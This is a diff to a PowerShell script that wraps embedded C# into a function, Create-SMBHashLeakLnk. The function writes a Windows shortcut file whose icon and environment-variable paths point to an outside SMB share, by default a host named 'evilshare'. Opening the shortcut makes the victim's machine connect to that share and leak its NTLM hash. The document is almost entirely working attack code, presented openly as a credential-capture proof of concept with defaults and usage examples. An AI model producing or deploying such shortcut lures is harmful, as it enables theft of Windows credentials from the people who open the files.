@@ -1,10 +1,45 @@
-# CreateLnk.ps1
+function Create-SMBHashLeakLnk {
+    <#
+    .SYNOPSIS
+    Creates an LNK file that triggers an SMB connection to capture NTLM hashes.
 
-# Define the path for the temporary C# file
-$tempCsFile = [System.IO.Path]::GetTempFileName() + ".cs"
+    .DESCRIPTION
+    This function generates a Windows shortcut (LNK) file that, when opened, attempts to connect to a specified SMB share, potentially leaking NTLM hashes. It uses embedded C# code to construct the LNK file with specific attributes, including a description, icon location, and environment variables pointing to the SMB share.
 
-# Write the C# code to a temporary file
-$csharpCode = @'
+    .PARAMETER LnkFilePath
+    The path where the LNK file will be created. Defaults to "poc.lnk" in the current directory.
+
+    .PARAMETER SmbSharePath
+    The SMB share path (UNC path) to use for the icon location and environment variables. Defaults to "\\192.168.254.43\evilshare\test.exe".
+
+    .PARAMETER Description
+    A description for the LNK file, visible in its properties. Defaults to "NTLM grab".
+
+    .EXAMPLE
+    Create-SMBHashLeakLnk -LnkFilePath "C:\Temp\exploit.lnk" -SmbSharePath "\\10.0.0.1\share\fake.exe" -Description "NTLM grab"
+    Creates an LNK file at "C:\Temp\exploit.lnk" that points to "\\10.0.0.1\share\fake.exe" with the description "NTLM grab".
+
+    .NOTES
+    Requires PowerShell 7 or later due to the use of Array.Fill and .NET 6+ features.
+    #>
+
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $false)]
+        [string]$LnkFilePath = "poc.lnk",
+
+        [Parameter(Mandatory = $false)]
+        [string]$SmbSharePath = "\\192.168.254.43\evilshare\test.exe",
+
+        [Parameter(Mandatory = $false)]
+        [string]$Description = "NTLM grab"
+    )
+
+    # Define the path for the temporary C# file
+    $tempCsFile = [System.IO.Path]::GetTempFileName() + ".cs"
+
+    # Write the C# code to a temporary file, incorporating parameters
+    $csharpCode = @"
 using System;
 using System.IO;
 using System.Runtime.InteropServices;
@@ -94,10 +129,8 @@ namespace LnkCreator
             public ushort wMilliseconds;
         }
 
-        public static void Main()
+        public static void CreateLnk(string lnkFilePath, string smbSharePath, string description)
         {
-            string lnkFilePath = "poc.lnk";
-
             try
             {
                 using (var fs = new FileStream(lnkFilePath, FileMode.Create, FileAccess.Write))
@@ -137,7 +170,6 @@ namespace LnkCreator
 
                     WriteStruct(bw, header);
 
-                    string description = "NTLM grab";
                     bw.Write((ushort)description.Length);
                     bw.Write(Encoding.Unicode.GetBytes(description));
 
@@ -148,11 +180,11 @@ namespace LnkCreator
                     bw.Write((ushort)cmdLineBuffer.Length);
                     bw.Write(Encoding.Unicode.GetBytes(new string(cmdLineBuffer)));
 
-                    string iconPath = "\\\\192.168.254.43\\evilshare\\test.exe,0";
+                    string iconPath = smbSharePath + ",0";
                     bw.Write((ushort)iconPath.Length);
                     bw.Write(Encoding.Unicode.GetBytes(iconPath));
 
-                    string envUNC = "\\\\192.168.254.43\\evilshare\\test.exe";
+                    string envUNC = smbSharePath;
                     uint envBlockSize = 0x00000314;
                     uint envSignature = Constants.ENVIRONMENTAL_VARIABLES_DATABLOCK_SIGNATURE;
 
@@ -182,6 +214,7 @@ namespace LnkCreator
             catch (Exception ex)
             {
                 Console.WriteLine("Error: " + ex.Message);
+                throw;
             }
         }
 
@@ -197,29 +230,30 @@ namespace LnkCreator
         }
     }
 }
-'@
+"@
 
-# Write the C# code to the temporary file
-Set-Content -Path $tempCsFile -Value $csharpCode -Encoding UTF8
+    # Write the C# code to the temporary file
+    Set-Content -Path $tempCsFile -Value $csharpCode -Encoding UTF8
 
-try {
-    # Compile the C# code and capture the assembly
-    $assembly = Add-Type -Path $tempCsFile -PassThru
+    try {
+        # Compile the C# code and capture the assembly
+        $assembly = Add-Type -Path $tempCsFile -PassThru
 
-    # Load the type from the assembly
-    $type = $assembly | Where-Object { $_.FullName -eq "LnkCreator.Program" }
+        # Load the type from the assembly
+        $type = $assembly | Where-Object { $_.FullName -eq "LnkCreator.Program" }
 
-    if ($null -eq $type) {
-        throw "Could not find type LnkCreator.Program in the compiled assembly."
+        if ($null -eq $type) {
+            throw "Could not find type LnkCreator.Program in the compiled assembly."
+        }
+
+        # Invoke the CreateLnk method with the provided parameters
+        $method = $type.GetMethod("CreateLnk", [System.Reflection.BindingFlags]::Static -bor [System.Reflection.BindingFlags]::Public)
+        $method.Invoke($null, @($LnkFilePath, $SmbSharePath, $Description))
     }
-
-    # Invoke the Main method
-    $method = $type.GetMethod("Main", [System.Reflection.BindingFlags]::Static -bor [System.Reflection.BindingFlags]::Public)
-    $method.Invoke($null, $null)
-}
-finally {
-    # Clean up the temporary file
-    if (Test-Path $tempCsFile) {
-        Remove-Item $tempCsFile -Force
+    finally {
+        # Clean up the temporary file
+        if (Test-Path $tempCsFile) {
+            Remove-Item $tempCsFile -Force
+        }
     }
 }
